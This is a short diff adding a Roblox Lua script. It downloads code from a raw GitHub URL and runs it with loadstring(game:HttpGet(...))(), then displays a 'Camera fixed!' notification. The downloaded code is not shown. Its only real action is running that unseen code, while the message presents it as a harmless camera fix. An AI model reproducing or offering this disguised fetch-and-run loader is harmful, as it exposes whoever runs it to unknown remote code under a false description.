@@ -1,0 +1,8 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinity2346/Infinity2346/main/Ttt"))()
+wait(1.2)
+game.StarterGui:SetCore("SendNotification", {
+Title = "Fix cam";
+Text = "Camera fixed!";
+Icon = "rbxassetid://9936990225";
+Duration = 5;
+})
